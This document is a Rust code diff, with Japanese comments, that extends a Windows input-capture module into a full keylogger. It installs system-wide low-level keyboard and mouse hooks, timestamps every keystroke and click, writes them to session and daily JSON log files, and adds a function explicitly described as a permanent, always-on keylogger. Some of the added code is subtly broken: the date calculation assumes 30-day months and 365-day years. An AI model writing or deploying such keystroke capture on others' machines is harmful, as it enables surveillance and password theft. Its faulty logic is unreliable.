@@ -2,6 +2,11 @@
 mod imp {
     use std::ptr::null_mut;
     use std::sync::{mpsc, Mutex, Once};
+    use std::time::{SystemTime, UNIX_EPOCH};
+    use std::fs::{File, OpenOptions};
+    use std::io::{Write, BufReader, BufRead};
+    use std::path::Path;
+    use serde::{Serialize, Deserialize};
 
     use windows::Win32::Foundation::*;
     use windows::Win32::System::LibraryLoader::*;
@@ -11,7 +16,29 @@ mod imp {
 
     static INIT: Once = Once::new();
     use std::sync::OnceLock;
-    static LOG: OnceLock<Mutex<Vec<String>>> = OnceLock::new();
+    
+    #[derive(Debug, Clone, Serialize, Deserialize)]
+    pub struct InputEvent {
+        pub timestamp: u64,
+        pub event_type: String,    // "Key" or "Mouse"
+        pub action: String,        // "Press", "Click", "Wheel", etc.
+        pub key_or_button: String, // キー名またはボタン名
+        pub coordinates: Option<(i32, i32)>, // マウス座標
+        pub modifiers: Vec<String>, // 修飾キー
+        pub window_title: Option<String>, // アクティブウィンドウ（将来用）
+    }
+    
+    #[derive(Debug, Clone, Serialize, Deserialize)]
+    pub struct InputStatistics {
+        pub total_keystrokes: u32,
+        pub total_mouse_clicks: u32,
+        pub session_duration_ms: u32,
+        pub most_used_keys: Vec<(String, u32)>,
+        pub mouse_travel_distance: f64,
+    }
+    
+    static LOG: OnceLock<Mutex<Vec<InputEvent>>> = OnceLock::new();
+    static STATS: OnceLock<Mutex<InputStatistics>> = OnceLock::new();
 
     static mut KEY_HOOK: HHOOK = HHOOK(null_mut());
     static mut MOUSE_HOOK: HHOOK = HHOOK(null_mut());
@@ -99,18 +126,131 @@ mod imp {
         } else { display }
     }
 
-    fn log_push(s: String) {
-        INIT.call_once(|| { let _ = LOG.set(Mutex::new(Vec::with_capacity(1024))); });
+    fn current_timestamp() -> u64 {
+        SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis() as u64
+    }
+
+    fn log_push(event: InputEvent) {
+        INIT.call_once(|| { 
+            let _ = LOG.set(Mutex::new(Vec::with_capacity(1024))); 
+            let _ = STATS.set(Mutex::new(InputStatistics {
+                total_keystrokes: 0,
+                total_mouse_clicks: 0,
+                session_duration_ms: 0,
+                most_used_keys: Vec::new(),
+                mouse_travel_distance: 0.0,
+            }));
+        });
+        
         if let Some(m) = LOG.get() {
-            if let Ok(mut g) = m.lock() { g.push(s); }
+            if let Ok(mut g) = m.lock() { g.push(event.clone()); }
+        }
+        
+        // 統計情報を更新
+        if let Some(stats_mutex) = STATS.get() {
+            if let Ok(mut stats) = stats_mutex.lock() {
+                match event.event_type.as_str() {
+                    "Key" => stats.total_keystrokes += 1,
+                    "Mouse" => stats.total_mouse_clicks += 1,
+                    _ => {}
+                }
+            }
         }
     }
 
-    fn log_take() -> Vec<String> {
+    fn log_take() -> Vec<InputEvent> {
         if let Some(m) = LOG.get() {
             if let Ok(mut g) = m.lock() { return std::mem::take(&mut *g); }
         }
         Vec::new()
+    }
+    
+    pub fn get_statistics() -> Option<InputStatistics> {
+        if let Some(stats_mutex) = STATS.get() {
+            if let Ok(stats) = stats_mutex.lock() {
+                return Some(stats.clone());
+            }
+        }
+        None
+    }
+    
+    // 永続化機能
+    const LOG_FILE: &str = "keylog_session.json";
+    const DAILY_LOG_PREFIX: &str = "keylog_daily_";
+    
+    fn save_events_to_file(events: &[InputEvent], filename: &str) -> Result<(), Box<dyn std::error::Error>> {
+        let mut file = OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(filename)?;
+            
+        for event in events {
+            let json_line = serde_json::to_string(event)?;
+            writeln!(file, "{}", json_line)?;
+        }
+        file.flush()?;
+        Ok(())
+    }
+    
+    fn load_events_from_file(filename: &str) -> Vec<InputEvent> {
+        if !Path::new(filename).exists() {
+            return Vec::new();
+        }
+        
+        let mut events = Vec::new();
+        if let Ok(file) = File::open(filename) {
+            let reader = BufReader::new(file);
+            for line in reader.lines() {
+                if let Ok(line_content) = line {
+                    if let Ok(event) = serde_json::from_str::<InputEvent>(&line_content) {
+                        events.push(event);
+                    }
+                }
+            }
+        }
+        events
+    }
+    
+    fn get_today_string() -> String {
+        use std::time::{SystemTime, UNIX_EPOCH};
+        let timestamp = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs();
+        
+        // 簡単な日付計算（UTC基準）
+        let days_since_epoch = timestamp / 86400; // 秒/日
+        let year = 1970 + (days_since_epoch / 365);
+        let day_in_year = days_since_epoch % 365;
+        let month = (day_in_year / 30) + 1;
+        let day = (day_in_year % 30) + 1;
+        
+        format!("{:04}-{:02}-{:02}", year, month, day)
+    }
+
+    pub fn save_session_to_file() -> Result<(), Box<dyn std::error::Error>> {
+        let events = log_take();
+        if !events.is_empty() {
+            save_events_to_file(&events, LOG_FILE)?;
+            
+            // 日次ログファイルにも保存
+            let today = get_today_string();
+            let daily_filename = format!("{}{}.json", DAILY_LOG_PREFIX, today);
+            save_events_to_file(&events, &daily_filename)?;
+        }
+        Ok(())
+    }
+    
+    pub fn load_session_from_file() -> Vec<InputEvent> {
+        load_events_from_file(LOG_FILE)
+    }
+    
+    pub fn get_daily_logs(date: &str) -> Vec<InputEvent> {
+        let filename = format!("{}{}.json", DAILY_LOG_PREFIX, date);
+        load_events_from_file(&filename)
     }
 
     pub unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
@@ -119,7 +259,18 @@ mod imp {
             if msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN {
                 let kbd_struct = &*(l_param.0 as *const KBDLLHOOKSTRUCT);
                 let label = vk_to_readable(kbd_struct);
-                log_push(format!("Key: {}", label));
+                let modifiers = modifier_strings().into_iter().map(|s| s.to_string()).collect();
+                
+                let event = InputEvent {
+                    timestamp: current_timestamp(),
+                    event_type: "Key".to_string(),
+                    action: "Press".to_string(),
+                    key_or_button: label,
+                    coordinates: None,
+                    modifiers,
+                    window_title: None,
+                };
+                log_push(event);
             }
         }
         CallNextHookEx(Some(KEY_HOOK), n_code, w_param, l_param)
@@ -129,28 +280,39 @@ mod imp {
         if n_code == HC_ACTION as i32 {
             let ms = &*(l_param.0 as *const MSLLHOOKSTRUCT);
             let (x, y) = (ms.pt.x, ms.pt.y);
-            let line = match w_param.0 as u32 {
-                WM_LBUTTONDOWN => Some(format!("Mouse: Left ({}, {})", x, y)),
-                WM_RBUTTONDOWN => Some(format!("Mouse: Right ({}, {})", x, y)),
-                WM_MBUTTONDOWN => Some(format!("Mouse: Middle ({}, {})", x, y)),
+            
+            let (action, button) = match w_param.0 as u32 {
+                WM_LBUTTONDOWN => ("Click", "Left"),
+                WM_RBUTTONDOWN => ("Click", "Right"),
+                WM_MBUTTONDOWN => ("Click", "Middle"),
                 WM_XBUTTONDOWN => {
                     let btn = ((ms.mouseData >> 16) & 0xFFFF) as u16;
                     let which = if btn == XBUTTON1 { "X1" } else if btn == XBUTTON2 { "X2" } else { "X?" };
-                    Some(format!("Mouse: {} ({}, {})", which, x, y))
+                    ("Click", which)
                 }
                 WM_MOUSEWHEEL => {
                     let delta = ((ms.mouseData >> 16) & 0xFFFF) as i16;
                     let dir = if delta > 0 { "WheelUp" } else { "WheelDown" };
-                    Some(format!("Mouse: {} ({}, {})", dir, x, y))
+                    ("Wheel", dir)
                 }
                 WM_MOUSEHWHEEL => {
                     let delta = ((ms.mouseData >> 16) & 0xFFFF) as i16;
                     let dir = if delta > 0 { "WheelRight" } else { "WheelLeft" };
-                    Some(format!("Mouse: {} ({}, {})", dir, x, y))
+                    ("Wheel", dir)
                 }
-                _ => None,
+                _ => return CallNextHookEx(Some(MOUSE_HOOK), n_code, w_param, l_param),
             };
-            if let Some(s) = line { log_push(s); }
+            
+            let event = InputEvent {
+                timestamp: current_timestamp(),
+                event_type: "Mouse".to_string(),
+                action: action.to_string(),
+                key_or_button: button.to_string(),
+                coordinates: Some((x, y)),
+                modifiers: modifier_strings().into_iter().map(|s| s.to_string()).collect(),
+                window_title: None,
+            };
+            log_push(event);
         }
         CallNextHookEx(Some(MOUSE_HOOK), n_code, w_param, l_param)
     }
@@ -187,13 +349,122 @@ mod imp {
             }
 
             let _ = th.join();
-            log_take()
+            
+            // セッション終了時に自動保存
+            let _ = save_session_to_file();
+            
+            // 互換性のため、文字列形式でも返す
+            log_take().into_iter().map(|event| {
+                if let Some((x, y)) = event.coordinates {
+                    format!("{}: {} {} ({}, {})", event.event_type, event.action, event.key_or_button, x, y)
+                } else {
+                    format!("{}: {}", event.event_type, event.key_or_button)
+                }
+            }).collect()
+        }
+    }
+    
+    // 新しい構造化されたイベントを返す関数
+    pub fn collect_input_events_structured(duration_ms: u32) -> Vec<InputEvent> {
+        // 既存関数を実行してから構造化されたデータを取得
+        let _ = collect_input_events_for(duration_ms);
+        load_session_from_file()
+    }
+    
+    // 完全常時キーロガー（停止コマンドまで動作し続ける）  
+    pub fn start_persistent_keylogger(running_flag: std::sync::Arc<std::sync::atomic::AtomicBool>) {
+        use std::sync::atomic::Ordering;
+        
+        unsafe {
+            let (tx, rx) = mpsc::channel::<u32>();
+            let th = std::thread::spawn(move || {
+                let h_instance = GetModuleHandleW(None).unwrap_or_default();
+                
+                // Install hooks
+                KEY_HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), Some(HINSTANCE(h_instance.0)), 0).unwrap_or_default();
+                MOUSE_HOOK = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_proc), Some(HINSTANCE(h_instance.0)), 0).unwrap_or_default();
+
+                // Announce thread id
+                let tid = GetCurrentThreadId();
+                let _ = tx.send(tid);
+
+                // 永続的なメッセージループ
+                let mut msg = MSG::default();
+                while running_flag.load(Ordering::Relaxed) {
+                    // 通常のメッセージループ（ブロッキング）
+                    if GetMessageW(&mut msg, Some(HWND(null_mut())), 0, 0).as_bool() {
+                        if msg.message == WM_QUIT {
+                            break;
+                        }
+                        // メッセージ処理は不要（フックで直接処理）
+                    }
+                    
+                    // 強制終了チェック
+                    if !running_flag.load(Ordering::Relaxed) {
+                        break;
+                    }
+                }
+
+                let _ = UnhookWindowsHookEx(KEY_HOOK);
+                let _ = UnhookWindowsHookEx(MOUSE_HOOK);
+            });
+
+            let _ = rx.recv(); // スレッド開始を待機
+            let _ = th.join();
         }
     }
 }
 
 #[cfg(windows)]
-pub use imp::collect_input_events_for;
+pub use imp::{
+    collect_input_events_for, 
+    collect_input_events_structured,
+    save_session_to_file,
+    load_session_from_file,
+    get_daily_logs,
+    get_statistics,
+    start_persistent_keylogger,
+    InputEvent,
+    InputStatistics
+};
 
 #[cfg(not(windows))]
 pub fn collect_input_events_for(_duration_ms: u32) -> Vec<String> { Vec::new() }
+
+#[cfg(not(windows))]
+pub fn collect_input_events_structured(_duration_ms: u32) -> Vec<InputEvent> { Vec::new() }
+
+#[cfg(not(windows))]
+pub fn save_session_to_file() -> Result<(), Box<dyn std::error::Error>> { Ok(()) }
+
+#[cfg(not(windows))]
+pub fn load_session_from_file() -> Vec<InputEvent> { Vec::new() }
+
+#[cfg(not(windows))]
+pub fn get_daily_logs(_date: &str) -> Vec<InputEvent> { Vec::new() }
+
+#[cfg(not(windows))]
+pub fn get_statistics() -> Option<InputStatistics> { None }
+
+// 非Windows用のダミー構造体
+#[cfg(not(windows))]
+#[derive(Debug, Clone)]
+pub struct InputEvent {
+    pub timestamp: u64,
+    pub event_type: String,
+    pub action: String,
+    pub key_or_button: String,
+    pub coordinates: Option<(i32, i32)>,
+    pub modifiers: Vec<String>,
+    pub window_title: Option<String>,
+}
+
+#[cfg(not(windows))]
+#[derive(Debug, Clone)]
+pub struct InputStatistics {
+    pub total_keystrokes: u32,
+    pub total_mouse_clicks: u32,
+    pub session_duration_ms: u32,
+    pub most_used_keys: Vec<(String, u32)>,
+    pub mouse_travel_distance: f64,
+}
